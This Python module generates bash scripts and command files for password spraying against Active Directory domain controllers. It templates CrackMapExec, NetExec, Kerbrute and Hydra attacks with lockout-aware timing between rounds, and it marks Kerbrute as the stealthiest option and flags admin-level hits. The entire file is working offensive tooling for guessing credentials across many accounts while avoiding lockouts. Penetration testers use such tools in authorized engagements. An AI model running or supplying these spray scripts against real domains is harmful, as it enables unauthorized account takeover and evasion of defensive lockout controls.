"""
Script Generator for Auto Password Spray

Generates bash scripts for manual review and execution.
Default mode - user reviews scripts before running them.

Generates:
- users.txt: Target usernames
- targets.txt: Target machines (IPs/hostnames)
- passwords.txt: Passwords to spray
- spray.sh: Main spray script with timing delays
- Per-round scripts for granular control
"""

from dataclasses import dataclass, field
from datetime import datetime
from pathlib import Path
from typing import List, Optional
import os
import stat

from .lockout_manager import LockoutManager, SprayWindow


@dataclass
class GeneratedFiles:
    """Container for generated file paths."""
    output_dir: Path
    users_file: Path
    passwords_file: Path
    main_script: Path
    round_scripts: List[Path]
    targets_file: Optional[Path] = None

    def __str__(self) -> str:
        lines = [
            "Generated Files:",
            f"  Directory:    {self.output_dir}",
            f"  Users:        {self.users_file.name}",
        ]
        if self.targets_file:
            lines.append(f"  Targets:      {self.targets_file.name}")
        lines.extend([
            f"  Passwords:    {self.passwords_file.name}",
            f"  Main script:  {self.main_script.name}",
            f"  Round scripts: {len(self.round_scripts)}",
        ])
        return "\n".join(lines)


class ScriptGenerator:
    """
    Generate bash scripts for password spraying.

    Creates review-able scripts with proper timing delays
    based on lockout policy.
    """

    # Script templates
    HEADER_TEMPLATE = '''#!/bin/bash
#
# Auto Password Spray Script
# Generated: {timestamp}
#
# Target Domain: {domain}
# DC IP: {dc_ip}
# Tool: {tool}
#
# REVIEW THIS SCRIPT BEFORE EXECUTING
# Ensure lockout policy is correctly configured
#
# Usage: bash {script_name}
#

set -e  # Exit on error

# Configuration
DOMAIN="{domain}"
DC_IP="{dc_ip}"
USER_FILE="{user_file}"
OUTPUT_DIR="{output_dir}"

# Colors for output
RED='\\033[0;31m'
GREEN='\\033[0;32m'
YELLOW='\\033[1;33m'
BLUE='\\033[0;34m'
NC='\\033[0m' # No Color

echo -e "${{BLUE}}========================================${{NC}}"
echo -e "${{BLUE}}     Auto Password Spray - {tool}${{NC}}"
echo -e "${{BLUE}}========================================${{NC}}"
echo ""
echo "Domain: $DOMAIN"
echo "DC IP: $DC_IP"
echo "Users: $(wc -l < $USER_FILE) targets"
echo ""
'''

    WAIT_FUNCTION = '''
# Function to wait with countdown
wait_for_window() {
    local seconds=$1
    local minutes=$((seconds / 60))

    echo -e "${YELLOW}[*] Waiting $minutes minutes for lockout window...${NC}"

    while [ $seconds -gt 0 ]; do
        mins=$((seconds / 60))
        secs=$((seconds % 60))
        printf "\\r    Time remaining: %02d:%02d " $mins $secs
        sleep 1
        seconds=$((seconds - 1))
    done

    echo ""
    echo -e "${GREEN}[+] Ready for next round${NC}"
    echo ""
}

'''

    SPRAY_CME_TEMPLATE = '''
# Spray with CrackMapExec
spray_password() {{
    local password="$1"
    local round="$2"

    echo -e "${{BLUE}}[Round $round] Testing: $password${{NC}}"

    crackmapexec smb $DC_IP -u $USER_FILE -p "$password" -d $DOMAIN --continue-on-success 2>&1 | tee -a "$OUTPUT_DIR/spray_results.txt"

    # Check for successes
    if grep -q "\\[\\+\\]" "$OUTPUT_DIR/spray_results.txt" 2>/dev/null; then
        echo -e "${{GREEN}}[+] Potential valid credentials found!${{NC}}"
    fi

    echo ""
}}
'''

    SPRAY_KERBRUTE_TEMPLATE = '''
# Spray with Kerbrute
spray_password() {{
    local password="$1"
    local round="$2"

    echo -e "${{BLUE}}[Round $round] Testing: $password${{NC}}"

    kerbrute passwordspray -d $DOMAIN --dc $DC_IP $USER_FILE "$password" 2>&1 | tee -a "$OUTPUT_DIR/spray_results.txt"

    # Check for successes
    if grep -qi "VALID LOGIN" "$OUTPUT_DIR/spray_results.txt" 2>/dev/null; then
        echo -e "${{GREEN}}[+] Valid credentials found!${{NC}}"
    fi

    echo ""
}}
'''

    SPRAY_NETEXEC_TEMPLATE = '''
# Spray with NetExec
spray_password() {{
    local password="$1"
    local round="$2"

    echo -e "${{BLUE}}[Round $round] Testing: $password${{NC}}"

    netexec smb $DC_IP -u $USER_FILE -p "$password" -d $DOMAIN --continue-on-success 2>&1 | tee -a "$OUTPUT_DIR/spray_results.txt"

    # Check for successes
    if grep -q "\\[\\+\\]" "$OUTPUT_DIR/spray_results.txt" 2>/dev/null; then
        echo -e "${{GREEN}}[+] Potential valid credentials found!${{NC}}"
    fi

    echo ""
}}
'''

    SPRAY_HYDRA_TEMPLATE = '''
# Spray with Hydra
spray_password() {{
    local password="$1"
    local round="$2"

    echo -e "${{BLUE}}[Round $round] Testing: $password${{NC}}"

    hydra -L $USER_FILE -p "$password" smb://$DC_IP 2>&1 | tee -a "$OUTPUT_DIR/spray_results.txt"

    # Check for successes
    if grep -qi "login:" "$OUTPUT_DIR/spray_results.txt" 2>/dev/null; then
        echo -e "${{GREEN}}[+] Valid credentials found!${{NC}}"
    fi

    echo ""
}}
'''

    FOOTER_TEMPLATE = '''
echo ""
echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}     Spray Complete${NC}"
echo -e "${GREEN}========================================${NC}"
echo ""
echo "Results saved to: $OUTPUT_DIR/spray_results.txt"
echo ""

# Show summary
if [ -f "$OUTPUT_DIR/spray_results.txt" ]; then
    echo "Valid credentials found:"
    grep -E "\\[\\+\\]|VALID LOGIN" "$OUTPUT_DIR/spray_results.txt" 2>/dev/null || echo "  (none)"
fi
'''

    def __init__(
        self,
        domain: str,
        dc_ip: str,
        output_dir: Optional[Path] = None,
        tool: str = "crackmapexec"
    ):
        """
        Initialize script generator.

        Args:
            domain: Target domain name
            dc_ip: Domain controller IP
            output_dir: Output directory (default: ./spray_output)
            tool: Spray tool to use
        """
        self.domain = domain
        self.dc_ip = dc_ip
        self.output_dir = Path(output_dir) if output_dir else Path("./spray_output")
        self.tool = tool.lower()

    def _get_spray_template(self) -> str:
        """Get spray function template for selected tool."""
        templates = {
            "crackmapexec": self.SPRAY_CME_TEMPLATE,
            "cme": self.SPRAY_CME_TEMPLATE,
            "netexec": self.SPRAY_NETEXEC_TEMPLATE,
            "nxc": self.SPRAY_NETEXEC_TEMPLATE,
            "kerbrute": self.SPRAY_KERBRUTE_TEMPLATE,
            "hydra": self.SPRAY_HYDRA_TEMPLATE,
        }
        return templates.get(self.tool, self.SPRAY_CME_TEMPLATE)

    def generate_spray_script(
        self,
        users: List[str],
        passwords: List[str],
        lockout_manager: Optional[LockoutManager] = None,
        machines: Optional[List[str]] = None
    ) -> GeneratedFiles:
        """
        Generate complete spray script package.

        Creates:
        - users.txt
        - targets.txt (if machines provided)
        - passwords.txt
        - spray.sh (main script with all rounds and delays)
        - spray_round_N.sh (individual round scripts)
        - spray_commands.txt (ready-to-use commands with placeholders)

        Args:
            users: List of target usernames
            passwords: List of passwords to spray
            lockout_manager: For timing calculations (optional)
            machines: List of target machines/IPs (optional)

        Returns:
            GeneratedFiles with paths to all generated files
        """
        machines = machines or []

        # Create output directory
        self.output_dir.mkdir(parents=True, exist_ok=True)

        # Generate user file
        users_file = self.output_dir / "users.txt"
        with open(users_file, 'w') as f:
            f.write('\n'.join(users))

        # Generate targets file (if machines provided)
        targets_file = None
        if machines:
            targets_file = self.output_dir / "targets.txt"
            with open(targets_file, 'w') as f:
                f.write('\n'.join(machines))

        # Generate passwords file
        passwords_file = self.output_dir / "passwords.txt"
        with open(passwords_file, 'w') as f:
            f.write('\n'.join(passwords))

        # Generate spray commands file with placeholders
        commands_file = self.output_dir / "spray_commands.txt"
        self._generate_commands_file(commands_file, users_file, targets_file)

        # Get spray plan
        if lockout_manager:
            plan = lockout_manager.get_spray_plan(passwords)
        else:
            # No lockout manager - single round with all passwords
            plan = [SprayWindow(
                round_number=1,
                passwords=passwords,
                max_attempts=len(passwords),
                delay_seconds=0
            )]

        # Generate main script
        main_script = self.output_dir / "spray.sh"
        round_scripts = self._generate_main_script(
            main_script, users_file, passwords_file, plan
        )

        return GeneratedFiles(
            output_dir=self.output_dir,
            users_file=users_file,
            passwords_file=passwords_file,
            main_script=main_script,
            round_scripts=round_scripts,
            targets_file=targets_file,
        )

    def _generate_commands_file(
        self,
        output_path: Path,
        users_file: Path,
        targets_file: Optional[Path]
    ) -> None:
        """
        Generate a file with ready-to-use spray commands.

        Commands have users/machines preconfigured but password as placeholder.
        """
        with open(output_path, 'w') as f:
            f.write(f"# Auto-Spray Commands - Generated {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"# Domain: {self.domain}\n")
            f.write(f"# DC IP: {self.dc_ip}\n")
            f.write(f"# Users file: {users_file}\n")
            if targets_file:
                f.write(f"# Targets file: {targets_file}\n")
            f.write("#\n")
            f.write("# Replace <PASSWORD> or <WORDLIST> with your password/wordlist\n")
            f.write("#" + "=" * 70 + "\n\n")

            # CrackMapExec/NetExec commands
            f.write("# === CrackMapExec / NetExec (SMB - shows Pwn3d! for admin) ===\n\n")

            # Single password spray against DC
            f.write("# Single password spray (against DC):\n")
            f.write(f"crackmapexec smb {self.dc_ip} -u {users_file} -p '<PASSWORD>' -d {self.domain} --continue-on-success\n\n")

            f.write("# Wordlist spray (against DC, one password per user):\n")
            f.write(f"crackmapexec smb {self.dc_ip} -u {users_file} -p <WORDLIST> -d {self.domain} --continue-on-success --no-bruteforce\n\n")

            # If targets available, add commands for spraying across machines
            if targets_file:
                f.write("# Single password spray (against all targets):\n")
                f.write(f"crackmapexec smb {targets_file} -u {users_file} -p '<PASSWORD>' -d {self.domain} --continue-on-success\n\n")

                f.write("# Wordlist spray (against all targets):\n")
                f.write(f"crackmapexec smb {targets_file} -u {users_file} -p <WORDLIST> -d {self.domain} --continue-on-success --no-bruteforce\n\n")

            # NetExec variants
            f.write("# NetExec variants (same syntax):\n")
            f.write(f"netexec smb {self.dc_ip} -u {users_file} -p '<PASSWORD>' -d {self.domain} --continue-on-success\n\n")

            # Kerbrute commands
            f.write("# === Kerbrute (Kerberos - stealthiest, fastest) ===\n\n")
            f.write("# Single password spray:\n")
            f.write(f"kerbrute passwordspray -d {self.domain} --dc {self.dc_ip} {users_file} '<PASSWORD>'\n\n")

            f.write("# Bruteforce single user with wordlist:\n")
            f.write(f"kerbrute bruteuser -d {self.domain} --dc {self.dc_ip} <WORDLIST> '<USERNAME>'\n\n")

            # Hydra commands
            f.write("# === Hydra (multi-protocol) ===\n\n")
            f.write(f"hydra -L {users_file} -p '<PASSWORD>' smb://{self.dc_ip}\n\n")
            f.write(f"hydra -L {users_file} -P <WORDLIST> smb://{self.dc_ip}\n\n")

            if targets_file:
                f.write(f"hydra -L {users_file} -p '<PASSWORD>' -M {targets_file} smb\n\n")

            # Summary
            f.write("# " + "=" * 70 + "\n")
            f.write("# Placeholders:\n")
            f.write("#   <PASSWORD>  - Single password to test (e.g., 'Summer2024!')\n")
            f.write("#   <WORDLIST>  - Path to password wordlist file\n")
            f.write("#   <USERNAME>  - Single username for targeted bruteforce\n")

    def _generate_main_script(
        self,
        script_path: Path,
        users_file: Path,
        passwords_file: Path,
        plan: List[SprayWindow]
    ) -> List[Path]:
        """Generate main spray script and round scripts."""
        round_scripts = []

        with open(script_path, 'w') as f:
            # Write header
            f.write(self.HEADER_TEMPLATE.format(
                timestamp=datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                domain=self.domain,
                dc_ip=self.dc_ip,
                tool=self.tool,
                script_name=script_path.name,
                user_file=str(users_file.absolute()),
                output_dir=str(self.output_dir.absolute()),
            ))

            # Write wait function
            f.write(self.WAIT_FUNCTION)

            # Write spray function
            f.write(self._get_spray_template())

            # Write confirmation prompt
            pwd_count = sum(len(w.passwords) for w in plan)
            f.write(f'''
# Confirmation
echo -e "${{YELLOW}}About to spray {pwd_count} passwords against $(wc -l < $USER_FILE) users${{NC}}"
echo -e "${{YELLOW}}Tool: {self.tool}${{NC}}"
echo ""
read -p "Continue? (y/N) " confirm
if [[ ! "$confirm" =~ ^[Yy]$ ]]; then
    echo "Aborted."
    exit 0
fi
echo ""

# Initialize results file
echo "# Spray Results - $(date)" > "$OUTPUT_DIR/spray_results.txt"
echo "" >> "$OUTPUT_DIR/spray_results.txt"

''')

            # Write spray rounds
            for i, window in enumerate(plan):
                round_num = window.round_number
                f.write(f'\n# === Round {round_num} ===\n')
                f.write(f'echo -e "${{BLUE}}=== Round {round_num}/{len(plan)} ===${{NC}}"\n')
                f.write(f'echo "Passwords: {len(window.passwords)}"\n')
                f.write('echo ""\n\n')

                # Spray each password in this round
                for pwd in window.passwords:
                    # Escape special characters in password
                    escaped_pwd = pwd.replace("'", "'\"'\"'")
                    f.write(f"spray_password '{escaped_pwd}' {round_num}\n")

                # Add delay if not last round
                if window.delay_seconds > 0 and i < len(plan) - 1:
                    f.write(f'\nwait_for_window {window.delay_seconds}\n')

                # Generate individual round script
                round_script = self._generate_round_script(window)
                round_scripts.append(round_script)

            # Write footer
            f.write(self.FOOTER_TEMPLATE)

        # Make scripts executable
        self._make_executable(script_path)
        for rs in round_scripts:
            self._make_executable(rs)

        return round_scripts

    def _generate_round_script(self, window: SprayWindow) -> Path:
        """Generate individual round script."""
        script_path = self.output_dir / f"spray_round_{window.round_number}.sh"

        with open(script_path, 'w') as f:
            f.write(f'''#!/bin/bash
#
# Spray Round {window.round_number}
# Passwords: {len(window.passwords)}
#

DOMAIN="{self.domain}"
DC_IP="{self.dc_ip}"
USER_FILE="{self.output_dir.absolute()}/users.txt"
OUTPUT_DIR="{self.output_dir.absolute()}"

''')
            f.write(self._get_spray_template())
            f.write('\n')

            for pwd in window.passwords:
                escaped_pwd = pwd.replace("'", "'\"'\"'")
                f.write(f"spray_password '{escaped_pwd}' {window.round_number}\n")

        return script_path

    def generate_kerbrute_script(
        self,
        users: List[str],
        passwords: List[str]
    ) -> Path:
        """Generate kerbrute-specific script (stealth mode)."""
        self.tool = "kerbrute"
        result = self.generate_spray_script(users, passwords, None)
        return result.main_script

    def generate_cme_script(
        self,
        users: List[str],
        passwords: List[str],
        lockout_manager: Optional[LockoutManager] = None
    ) -> Path:
        """Generate CrackMapExec script with admin detection."""
        self.tool = "crackmapexec"
        result = self.generate_spray_script(users, passwords, lockout_manager)
        return result.main_script

    @staticmethod
    def _make_executable(path: Path) -> None:
        """Make a file executable."""
        try:
            current = os.stat(path).st_mode
            os.chmod(path, current | stat.S_IXUSR | stat.S_IXGRP | stat.S_IXOTH)
        except Exception:
            pass

    def generate_quick_spray(
        self,
        users: List[str],
        password: str
    ) -> str:
        """
        Generate a single-line spray command for quick testing.

        Args:
            users: List of target usernames
            password: Single password to test

        Returns:
            Ready-to-run command string
        """
        user_file = self.output_dir / "users.txt"
        self.output_dir.mkdir(parents=True, exist_ok=True)

        with open(user_file, 'w') as f:
            f.write('\n'.join(users))

        templates = {
            "crackmapexec": f"crackmapexec smb {self.dc_ip} -u {user_file} -p '{password}' -d {self.domain} --continue-on-success",
            "netexec": f"netexec smb {self.dc_ip} -u {user_file} -p '{password}' -d {self.domain} --continue-on-success",
            "kerbrute": f"kerbrute passwordspray -d {self.domain} --dc {self.dc_ip} {user_file} '{password}'",
            "hydra": f"hydra -L {user_file} -p '{password}' smb://{self.dc_ip}",
        }

        return templates.get(self.tool, templates["crackmapexec"])
